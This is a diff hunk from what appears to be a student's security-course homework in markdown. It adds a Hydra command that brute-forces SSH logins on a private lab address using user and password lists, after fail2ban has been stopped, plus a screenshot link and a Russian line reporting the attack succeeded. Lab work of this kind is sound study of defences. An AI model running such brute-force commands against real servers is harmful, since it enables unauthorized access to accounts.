@@ -165,6 +165,9 @@ systemctl stop fail2ban.service && systemctl status fail2ban.service
 ```
 ![image](https://github.com/killakazzak/13-03-sdb-hw/assets/32342205/25ab5065-9094-4c8f-855f-3f8fe1a37495)
 
+hydra -L user.txt -P pass.txt 10.159.86.98 ssh
 
+![image](https://github.com/killakazzak/13-03-sdb-hw/assets/32342205/1caf484a-b048-4805-b1ba-16b7d3a0bca7)
 
+**Атака прошла успешно!**
 
